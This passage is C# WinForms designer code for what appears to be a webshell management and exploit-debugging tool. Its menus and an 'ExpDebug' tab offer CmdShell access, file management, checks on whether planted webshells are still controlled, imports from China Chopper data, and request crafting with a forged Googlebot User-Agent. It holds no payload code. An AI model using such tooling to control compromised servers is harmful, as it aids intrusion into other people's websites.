            this.cookie浏览器ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.cookie浏览器ToolStripMenuItem.Text = "Cookie登陆";
            this.cookie浏览器ToolStripMenuItem.Click += new System.EventHandler(this.cookie浏览器ToolStripMenuItem_Click);
            // 
            // 文件管理ToolStripMenuItem
            // 
            this.文件管理ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("文件管理ToolStripMenuItem.Image")));
            this.文件管理ToolStripMenuItem.Name = "文件管理ToolStripMenuItem";
            this.文件管理ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.文件管理ToolStripMenuItem.Text = "文件管理";
            this.文件管理ToolStripMenuItem.Visible = false;
            this.文件管理ToolStripMenuItem.Click += new System.EventHandler(this.文件管理ToolStripMenuItem_Click);
            // 
            // 虚拟CMD终端ToolStripMenuItem
            // 
            this.虚拟CMD终端ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("虚拟CMD终端ToolStripMenuItem.Image")));
            this.虚拟CMD终端ToolStripMenuItem.Name = "虚拟CMD终端ToolStripMenuItem";
            this.虚拟CMD终端ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.虚拟CMD终端ToolStripMenuItem.Text = "CmdShell";
            this.虚拟CMD终端ToolStripMenuItem.Click += new System.EventHandler(this.虚拟CMD终端ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(127, 6);
            // 
            // 列表排序ToolStripMenuItem
            // 
            this.列表排序ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.脚本分类ToolStripMenuItem1,
            this.地区分类ToolStripMenuItem1,
            this.系统分类ToolStripMenuItem,
            this.toolStripMenuItem8,
            this.rP值大小ToolStripMenuItem});
            this.列表排序ToolStripMenuItem.Name = "列表排序ToolStripMenuItem";
            this.列表排序ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.列表排序ToolStripMenuItem.Text = "列表排序";
            this.列表排序ToolStripMenuItem.Visible = false;
            // 
            // 脚本分类ToolStripMenuItem1
            // 
            this.脚本分类ToolStripMenuItem1.Name = "脚本分类ToolStripMenuItem1";
            this.脚本分类ToolStripMenuItem1.Size = new System.Drawing.Size(118, 22);
            this.脚本分类ToolStripMenuItem1.Text = "脚本分类";
            // 
            // 地区分类ToolStripMenuItem1
            // 
            this.地区分类ToolStripMenuItem1.Name = "地区分类ToolStripMenuItem1";
            this.地区分类ToolStripMenuItem1.Size = new System.Drawing.Size(118, 22);
            this.地区分类ToolStripMenuItem1.Text = "地区分类";
            // 
            // 系统分类ToolStripMenuItem
            // 
            this.系统分类ToolStripMenuItem.Name = "系统分类ToolStripMenuItem";
            this.系统分类ToolStripMenuItem.Size = new System.Drawing.Size(118, 22);
            this.系统分类ToolStripMenuItem.Text = "系统分类";
            // 
            // toolStripMenuItem8
            // 
            this.toolStripMenuItem8.Name = "toolStripMenuItem8";
            this.toolStripMenuItem8.Size = new System.Drawing.Size(115, 6);
            // 
            // rP值大小ToolStripMenuItem
            // 
            this.rP值大小ToolStripMenuItem.Name = "rP值大小ToolStripMenuItem";
            this.rP值大小ToolStripMenuItem.Size = new System.Drawing.Size(118, 22);
            this.rP值大小ToolStripMenuItem.Text = "RP值大小";
            // 
            // 检查是否在控ToolStripMenuItem
            // 
            this.检查是否在控ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.检测当前WebShellToolStripMenuItem,
            this.检测选中WebShellToolStripMenuItem,
            this.检测所有WebShellToolStripMenuItem,
            this.toolStripMenuItem9,
            this.检测网站存活ToolStripMenuItem});
            this.检查是否在控ToolStripMenuItem.Name = "检查是否在控ToolStripMenuItem";
            this.检查是否在控ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.检查是否在控ToolStripMenuItem.Text = "在控状态";
            this.检查是否在控ToolStripMenuItem.Visible = false;
            // 
            // 检测当前WebShellToolStripMenuItem
            // 
            this.检测当前WebShellToolStripMenuItem.Name = "检测当前WebShellToolStripMenuItem";
            this.检测当前WebShellToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.检测当前WebShellToolStripMenuItem.Text = "检测当前WebShell";
            // 
            // 检测选中WebShellToolStripMenuItem
            // 
            this.检测选中WebShellToolStripMenuItem.Name = "检测选中WebShellToolStripMenuItem";
            this.检测选中WebShellToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.检测选中WebShellToolStripMenuItem.Text = "检测选中WebShell";
            // 
            // 检测所有WebShellToolStripMenuItem
            // 
            this.检测所有WebShellToolStripMenuItem.Name = "检测所有WebShellToolStripMenuItem";
            this.检测所有WebShellToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.检测所有WebShellToolStripMenuItem.Text = "检测所有WebShell";
            // 
            // toolStripMenuItem9
            // 
            this.toolStripMenuItem9.Name = "toolStripMenuItem9";
            this.toolStripMenuItem9.Size = new System.Drawing.Size(163, 6);
            // 
            // 检测网站存活ToolStripMenuItem
            // 
            this.检测网站存活ToolStripMenuItem.Name = "检测网站存活ToolStripMenuItem";
            this.检测网站存活ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.检测网站存活ToolStripMenuItem.Text = "检测 只看是否200";
            // 
            // toolStripMenuItem7
            // 
            this.toolStripMenuItem7.Name = "toolStripMenuItem7";
            this.toolStripMenuItem7.Size = new System.Drawing.Size(127, 6);
            // 
            // 合并数据库ToolStripMenuItem
            // 
            this.合并数据库ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.导入飞刀数据ToolStripMenuItem,
            this.导入菜刀数据ToolStripMenuItem});
            this.合并数据库ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("合并数据库ToolStripMenuItem.Image")));
            this.合并数据库ToolStripMenuItem.Name = "合并数据库ToolStripMenuItem";
            this.合并数据库ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.合并数据库ToolStripMenuItem.Text = "合并数据库";
            // 
            // 导入飞刀数据ToolStripMenuItem
            // 
            this.导入飞刀数据ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("导入飞刀数据ToolStripMenuItem.Image")));
            this.导入飞刀数据ToolStripMenuItem.Name = "导入飞刀数据ToolStripMenuItem";
            this.导入飞刀数据ToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.导入飞刀数据ToolStripMenuItem.Text = "导入飞刀数据";
            // 
            // 导入菜刀数据ToolStripMenuItem
            // 
            this.导入菜刀数据ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("导入菜刀数据ToolStripMenuItem.Image")));
            this.导入菜刀数据ToolStripMenuItem.Name = "导入菜刀数据ToolStripMenuItem";
            this.导入菜刀数据ToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.导入菜刀数据ToolStripMenuItem.Text = "导入菜刀数据";
            this.导入菜刀数据ToolStripMenuItem.Click += new System.EventHandler(this.导入菜刀数据ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem6
            // 
            this.toolStripMenuItem6.Name = "toolStripMenuItem6";
            this.toolStripMenuItem6.Size = new System.Drawing.Size(127, 6);
            // 
            // tab_SubmitTest
            // 
            this.tab_SubmitTest.Controls.Add(this.txt_addURL);
            this.tab_SubmitTest.Controls.Add(this.txt_TimeOut);
            this.tab_SubmitTest.Controls.Add(this.cbb_expDebugCoding);
            this.tab_SubmitTest.Controls.Add(this.txt_UserAgent);
            this.tab_SubmitTest.Controls.Add(this.web_expDebugResult);
            this.tab_SubmitTest.Controls.Add(this.txt_SubmitData);
            this.tab_SubmitTest.Controls.Add(this.txt_RefererURL);
            this.tab_SubmitTest.Controls.Add(this.txt_submitCookies);
            this.tab_SubmitTest.Controls.Add(this.rb_none);
            this.tab_SubmitTest.Controls.Add(this.rb_PostMethod);
            this.tab_SubmitTest.Controls.Add(this.rb_GetMethod);
            this.tab_SubmitTest.Controls.Add(this.txt_k8url);
            this.tab_SubmitTest.Controls.Add(this.chk_submitCookies);
            this.tab_SubmitTest.Controls.Add(this.Cbb_UserAgent);
            this.tab_SubmitTest.Controls.Add(this.pictureBox12);
            this.tab_SubmitTest.Controls.Add(this.label5);
            this.tab_SubmitTest.Controls.Add(this.pictureBox11);
            this.tab_SubmitTest.Controls.Add(this.label15);
            this.tab_SubmitTest.Controls.Add(this.pictureBox10);
            this.tab_SubmitTest.Controls.Add(this.label4);
            this.tab_SubmitTest.Controls.Add(this.pictureBox9);
            this.tab_SubmitTest.Controls.Add(this.pictureBox8);
            this.tab_SubmitTest.Controls.Add(this.label32);
            this.tab_SubmitTest.Controls.Add(this.pictureBox7);
            this.tab_SubmitTest.Controls.Add(this.pictureBox6);
            this.tab_SubmitTest.Controls.Add(this.pictureBox5);
            this.tab_SubmitTest.Controls.Add(this.pictureBox4);
            this.tab_SubmitTest.Controls.Add(this.pictureBox3);
            this.tab_SubmitTest.Controls.Add(this.pictureBox2);
            this.tab_SubmitTest.Controls.Add(this.pic_server);
            this.tab_SubmitTest.Controls.Add(this.lbl_expDebugInfo);
            this.tab_SubmitTest.Controls.Add(this.Btn_Submit);
            this.tab_SubmitTest.Controls.Add(this.btn_AddUpdateExp);
            this.tab_SubmitTest.Controls.Add(this.label16);
            this.tab_SubmitTest.Controls.Add(this.chk_allowRedirect);
            this.tab_SubmitTest.Controls.Add(this.chk_Result_WebBrowser);
            this.tab_SubmitTest.Controls.Add(this.label3);
            this.tab_SubmitTest.Controls.Add(this.label2);
            this.tab_SubmitTest.Controls.Add(this.chk_ResultText);
            this.tab_SubmitTest.Controls.Add(this.label1);
            this.tab_SubmitTest.Controls.Add(this.txt_Result);
            this.tab_SubmitTest.ImageIndex = 66;
            this.tab_SubmitTest.Location = new System.Drawing.Point(4, 4);
            this.tab_SubmitTest.Name = "tab_SubmitTest";
            this.tab_SubmitTest.Padding = new System.Windows.Forms.Padding(3);
            this.tab_SubmitTest.Size = new System.Drawing.Size(980, 623);
            this.tab_SubmitTest.TabIndex = 0;
            this.tab_SubmitTest.Text = "ExpDebug";
            this.tab_SubmitTest.UseVisualStyleBackColor = true;
            // 
            // txt_addURL
            // 
            this.txt_addURL.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_addURL.Location = new System.Drawing.Point(673, 0);
            this.txt_addURL.Name = "txt_addURL";
            this.txt_addURL.Size = new System.Drawing.Size(218, 21);
            this.txt_addURL.TabIndex = 77;
            // 
            // txt_TimeOut
            // 
            this.txt_TimeOut.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_TimeOut.Location = new System.Drawing.Point(656, 25);
            this.txt_TimeOut.Name = "txt_TimeOut";
            this.txt_TimeOut.Size = new System.Drawing.Size(30, 21);
            this.txt_TimeOut.TabIndex = 49;
            this.txt_TimeOut.Text = "8000";
            // 
            // cbb_expDebugCoding
            // 
            this.cbb_expDebugCoding.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.cbb_expDebugCoding.FormattingEnabled = true;
            this.cbb_expDebugCoding.Items.AddRange(new object[] {
            "字符编码",
            "Unicode(全世界)",
            "UTF-8(国际编码)",
            "GBK(GB2312+Big5+古汉语)",
            "GB2312(国标码-简体中文)",
            "Big5(港澳台-繁体中文)",
            "Euc-KR(韩文)",
            "Euc-JP(日文)",
            "Shift_JIS(日本电脑系统编码)",
            "Windows-1251(俄国)",
            "Windows-874(泰国)",
            "Windows-1258(越南字符)",
            "Ks_c_5601-1987(朝鲜语)",
            "Windows-1250(中欧字符)",
            "Windows-1251(西里尔字符)",
            "Windows-1252(西欧字符)",
            "Windows-1253(希腊字符)",
            "Windows-1254(土耳其字符)",
            "Windows-1255(希伯来字符)",
            "Windows-1256(阿拉伯字符)",
            "Windows-1257(波罗的海字符)"});
            this.cbb_expDebugCoding.Location = new System.Drawing.Point(717, 25);
            this.cbb_expDebugCoding.Name = "cbb_expDebugCoding";
            this.cbb_expDebugCoding.Size = new System.Drawing.Size(174, 20);
            this.cbb_expDebugCoding.TabIndex = 48;
            this.cbb_expDebugCoding.Text = "UTF-8(国际编码)";
            this.cbb_expDebugCoding.SelectedIndexChanged += new System.EventHandler(this.cbb_expDebugCoding_SelectedIndexChanged);
            this.cbb_expDebugCoding.TextChanged += new System.EventHandler(this.cbb_expDebugCoding_TextChanged);
            // 
            // txt_UserAgent
            // 
            this.txt_UserAgent.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_UserAgent.Location = new System.Drawing.Point(398, 50);
            this.txt_UserAgent.Name = "txt_UserAgent";
            this.txt_UserAgent.Size = new System.Drawing.Size(493, 21);
            this.txt_UserAgent.TabIndex = 69;
            this.txt_UserAgent.Text = "* Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
            // 
            // web_expDebugResult
            // 
            this.web_expDebugResult.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.web_expDebugResult.Location = new System.Drawing.Point(6, 242);
            this.web_expDebugResult.MinimumSize = new System.Drawing.Size(20, 20);
            this.web_expDebugResult.Name = "web_expDebugResult";
            this.web_expDebugResult.ScriptErrorsSuppressed = true;
            this.web_expDebugResult.Size = new System.Drawing.Size(966, 381);
            this.web_expDebugResult.TabIndex = 64;
            this.web_expDebugResult.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.web_Result_DocumentCompleted);
            // 
            // txt_SubmitData
            // 
            this.txt_SubmitData.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_SubmitData.Location = new System.Drawing.Point(4, 161);
            this.txt_SubmitData.Multiline = true;
            this.txt_SubmitData.Name = "txt_SubmitData";
            this.txt_SubmitData.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_SubmitData.Size = new System.Drawing.Size(970, 53);
            this.txt_SubmitData.TabIndex = 44;
            // 
            // txt_RefererURL
            // 
            this.txt_RefererURL.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_RefererURL.Location = new System.Drawing.Point(82, 111);
            this.txt_RefererURL.Name = "txt_RefererURL";
            this.txt_RefererURL.Size = new System.Drawing.Size(892, 21);
            this.txt_RefererURL.TabIndex = 71;
            // 
            // txt_submitCookies
            // 
            this.txt_submitCookies.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_submitCookies.Location = new System.Drawing.Point(6, 73);
            this.txt_submitCookies.Multiline = true;
            this.txt_submitCookies.Name = "txt_submitCookies";
            this.txt_submitCookies.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_submitCookies.Size = new System.Drawing.Size(968, 33);
            this.txt_submitCookies.TabIndex = 65;
            // 
            // rb_none
            // 
            this.rb_none.AutoSize = true;
            this.rb_none.Location = new System.Drawing.Point(171, 26);
            this.rb_none.Name = "rb_none";
            this.rb_none.Size = new System.Drawing.Size(47, 16);
            this.rb_none.TabIndex = 74;
            this.rb_none.TabStop = true;
            this.rb_none.Text = "NONE";
            this.rb_none.UseVisualStyleBackColor = true;
            this.rb_none.CheckedChanged += new System.EventHandler(this.rb_none_CheckedChanged);
            // 
            // rb_PostMethod
            // 
            this.rb_PostMethod.AutoSize = true;
            this.rb_PostMethod.Location = new System.Drawing.Point(118, 26);
            this.rb_PostMethod.Name = "rb_PostMethod";
            this.rb_PostMethod.Size = new System.Drawing.Size(47, 16);
            this.rb_PostMethod.TabIndex = 75;
            this.rb_PostMethod.TabStop = true;
            this.rb_PostMethod.Text = "POST";
            this.rb_PostMethod.UseVisualStyleBackColor = true;
            this.rb_PostMethod.CheckedChanged += new System.EventHandler(this.rb_PostMethod_CheckedChanged);
            // 
            // rb_GetMethod
            // 
            this.rb_GetMethod.AutoSize = true;
            this.rb_GetMethod.Location = new System.Drawing.Point(71, 26);
            this.rb_GetMethod.Name = "rb_GetMethod";
            this.rb_GetMethod.Size = new System.Drawing.Size(41, 16);
            this.rb_GetMethod.TabIndex = 76;
            this.rb_GetMethod.TabStop = true;
            this.rb_GetMethod.Text = "GET";
            this.rb_GetMethod.UseVisualStyleBackColor = true;
            this.rb_GetMethod.CheckedChanged += new System.EventHandler(this.rb_GetMethod_CheckedChanged);
            // 
            // txt_k8url
            // 
            this.txt_k8url.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_k8url.Location = new System.Drawing.Point(71, 0);
            this.txt_k8url.Name = "txt_k8url";
            this.txt_k8url.Size = new System.Drawing.Size(520, 21);
            this.txt_k8url.TabIndex = 39;
            this.txt_k8url.TextChanged += new System.EventHandler(this.txt_k8url_TextChanged);
            this.txt_k8url.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txt_k8url_KeyDown);
            // 
            // chk_submitCookies
            // 
            this.chk_submitCookies.AutoSize = true;
            this.chk_submitCookies.Location = new System.Drawing.Point(26, 51);
            this.chk_submitCookies.Name = "chk_submitCookies";
            this.chk_submitCookies.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.chk_submitCookies.Size = new System.Drawing.Size(60, 16);
            this.chk_submitCookies.TabIndex = 41;
            this.chk_submitCookies.Text = "Cookie";
            this.chk_submitCookies.UseVisualStyleBackColor = true;
            this.chk_submitCookies.CheckedChanged += new System.EventHandler(this.chk_Cookies_CheckedChanged);
            // 
            // Cbb_UserAgent
            // 
            this.Cbb_UserAgent.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.Cbb_UserAgent.FormattingEnabled = true;
            this.Cbb_UserAgent.Items.AddRange(new object[] {
            "===爬虫===",
            "MSN爬虫",
            "百度爬虫",
            "google爬虫",
            "google爬虫2",
            "google爬虫3",
            "雅虎中国爬虫",
            "雅虎美国爬虫",
            "新浪爱问爬虫1",
            "新浪爱问爬虫2",
            "搜狗爬虫1",
            "搜狗爬虫2",
            "网易爬虫",
            "==浏览器==",
            "Firefox 19.0",
            "FireFox 6.0",
            "IE6",
            "IE6(XP)",
            "IE8(XP)",
            "IE9(Win7)",
            "Safari 4",
            "Chrome 25.0",
            "===手机===",
            "IPhone 3.0",
            "IPhone 4S",
            "Nokia C5-00(S60v3)",
            "HTC Legend(Android)",
            "IPad",
            "===测试===",
            "phpinfo()"});
            this.Cbb_UserAgent.Location = new System.Drawing.Point(457, 25);
            this.Cbb_UserAgent.Name = "Cbb_UserAgent";
            this.Cbb_UserAgent.Size = new System.Drawing.Size(134, 20);
            this.Cbb_UserAgent.TabIndex = 62;
            this.Cbb_UserAgent.Text = "google爬虫";
            this.Cbb_UserAgent.SelectedIndexChanged += new System.EventHandler(this.Cbb_UserAgent_SelectedIndexChanged);
            // 
            // pictureBox12
            // 
            this.pictureBox12.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox12.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox12.Image")));
            this.pictureBox12.Location = new System.Drawing.Point(290, 26);
            this.pictureBox12.Name = "pictureBox12";
            this.pictureBox12.Size = new System.Drawing.Size(16, 16);
            this.pictureBox12.TabIndex = 91;
            this.pictureBox12.TabStop = false;
            // 
            // label5
            // 
            this.label5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(396, 29);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(65, 12);
            this.label5.TabIndex = 61;
            this.label5.Text = "UserAgent:";
            // 
            // pictureBox11
            // 
            this.pictureBox11.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox11.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox11.Image")));
            this.pictureBox11.Location = new System.Drawing.Point(378, 26);
            this.pictureBox11.Name = "pictureBox11";
            this.pictureBox11.Size = new System.Drawing.Size(16, 16);
            this.pictureBox11.TabIndex = 90;
            this.pictureBox11.TabStop = false;
            // 
            // label15
            // 
            this.label15.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(314, 53);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(89, 12);
            this.label15.TabIndex = 70;
            this.label15.Text = "伪造UserAgent:";
            // 
            // pictureBox10
            // 
            this.pictureBox10.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox10.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox10.Image")));
            this.pictureBox10.Location = new System.Drawing.Point(290, 51);
            this.pictureBox10.Name = "pictureBox10";
            this.pictureBox10.Size = new System.Drawing.Size(16, 16);
            this.pictureBox10.TabIndex = 89;
            this.pictureBox10.TabStop = false;
            // 
            // label4
            // 
            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(624, 29);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(35, 12);
            this.label4.TabIndex = 50;
            this.label4.Text = "超时:";
            // 
            // pictureBox9
            // 
            this.pictureBox9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox9.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox9.Image")));
            this.pictureBox9.Location = new System.Drawing.Point(696, 26);
            this.pictureBox9.Name = "pictureBox9";
            this.pictureBox9.Size = new System.Drawing.Size(16, 16);
            this.pictureBox9.TabIndex = 88;
            this.pictureBox9.TabStop = false;
            // 
            // pictureBox8
            // 
            this.pictureBox8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox8.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox8.Image")));
            this.pictureBox8.Location = new System.Drawing.Point(602, 26);
            this.pictureBox8.Name = "pictureBox8";
            this.pictureBox8.Size = new System.Drawing.Size(16, 16);
            this.pictureBox8.TabIndex = 87;
            this.pictureBox8.TabStop = false;
            // 
            // label32
            // 
            this.label32.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label32.AutoSize = true;
            this.label32.Location = new System.Drawing.Point(620, 3);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(53, 12);
            this.label32.TabIndex = 78;
            this.label32.Text = "附加URL:";
            // 
            // pictureBox7
            // 
            this.pictureBox7.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox7.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox7.Image")));
            this.pictureBox7.Location = new System.Drawing.Point(602, 2);
            this.pictureBox7.Name = "pictureBox7";
            this.pictureBox7.Size = new System.Drawing.Size(16, 16);
            this.pictureBox7.TabIndex = 86;
            this.pictureBox7.TabStop = false;
            // 
            // pictureBox6
            // 
            this.pictureBox6.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox6.Image")));
            this.pictureBox6.Location = new System.Drawing.Point(5, 112);
            this.pictureBox6.Name = "pictureBox6";
            this.pictureBox6.Size = new System.Drawing.Size(16, 16);
            this.pictureBox6.TabIndex = 85;
            this.pictureBox6.TabStop = false;
            // 
            // pictureBox5
            // 
            this.pictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox5.Image")));
            this.pictureBox5.Location = new System.Drawing.Point(5, 140);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(16, 16);
            this.pictureBox5.TabIndex = 84;
            this.pictureBox5.TabStop = false;
            // 
            // pictureBox4
            // 
            this.pictureBox4.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox4.Image")));
            this.pictureBox4.Location = new System.Drawing.Point(5, 2);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(16, 16);
            this.pictureBox4.TabIndex = 83;
            this.pictureBox4.TabStop = false;
            // 
            // pictureBox3
            // 
            this.pictureBox3.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox3.Image")));
            this.pictureBox3.Location = new System.Drawing.Point(5, 26);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(16, 16);
            this.pictureBox3.TabIndex = 82;
            this.pictureBox3.TabStop = false;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
            this.pictureBox2.Location = new System.Drawing.Point(5, 50);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(16, 16);
            this.pictureBox2.TabIndex = 81;
            this.pictureBox2.TabStop = false;
            // 
            // pic_server
            // 
            this.pic_server.Image = ((System.Drawing.Image)(resources.GetObject("pic_server.Image")));
            this.pic_server.Location = new System.Drawing.Point(5, 221);
            this.pic_server.Name = "pic_server";
            this.pic_server.Size = new System.Drawing.Size(16, 16);
            this.pic_server.TabIndex = 80;
            this.pic_server.TabStop = false;
            // 
            // lbl_expDebugInfo
            // 
            this.lbl_expDebugInfo.AutoSize = true;
            this.lbl_expDebugInfo.ContextMenuStrip = this.rm_CopyDebugInfo;
            this.lbl_expDebugInfo.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.lbl_expDebugInfo.Location = new System.Drawing.Point(24, 223);
            this.lbl_expDebugInfo.Name = "lbl_expDebugInfo";
            this.lbl_expDebugInfo.Size = new System.Drawing.Size(65, 12);
            this.lbl_expDebugInfo.TabIndex = 79;
            this.lbl_expDebugInfo.Text = "服务器信息";
            this.lbl_expDebugInfo.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            // 
            // rm_CopyDebugInfo
            // 
            this.rm_CopyDebugInfo.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.全部复制ToolStripMenuItem,
            this.toolStripMenuItem62,
            this.只复制IPToolStripMenuItem,
            this.复制地理位置ToolStripMenuItem,
            this.复制BannerToolStripMenuItem});
            this.rm_CopyDebugInfo.Name = "rm_CopyDebugInfo";
            this.rm_CopyDebugInfo.Size = new System.Drawing.Size(131, 98);
            // 
            // 全部复制ToolStripMenuItem
            // 
            this.全部复制ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("全部复制ToolStripMenuItem.Image")));
            this.全部复制ToolStripMenuItem.Name = "全部复制ToolStripMenuItem";
            this.全部复制ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.全部复制ToolStripMenuItem.Text = "复制全部";
            this.全部复制ToolStripMenuItem.Click += new System.EventHandler(this.全部复制ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem62
            // 
            this.toolStripMenuItem62.Name = "toolStripMenuItem62";
            this.toolStripMenuItem62.Size = new System.Drawing.Size(127, 6);
            // 
            // 只复制IPToolStripMenuItem
            // 
            this.只复制IPToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("只复制IPToolStripMenuItem.Image")));
            this.只复制IPToolStripMenuItem.Name = "只复制IPToolStripMenuItem";
            this.只复制IPToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.只复制IPToolStripMenuItem.Text = "复制IP";
            this.只复制IPToolStripMenuItem.Click += new System.EventHandler(this.只复制IPToolStripMenuItem_Click);
            // 
            // 复制地理位置ToolStripMenuItem
            // 
            this.复制地理位置ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("复制地理位置ToolStripMenuItem.Image")));
            this.复制地理位置ToolStripMenuItem.Name = "复制地理位置ToolStripMenuItem";
            this.复制地理位置ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.复制地理位置ToolStripMenuItem.Text = "复制位置";
            this.复制地理位置ToolStripMenuItem.Click += new System.EventHandler(this.复制地理位置ToolStripMenuItem_Click);
            // 
            // 复制BannerToolStripMenuItem
            // 
            this.复制BannerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("复制BannerToolStripMenuItem.Image")));
            this.复制BannerToolStripMenuItem.Name = "复制BannerToolStripMenuItem";
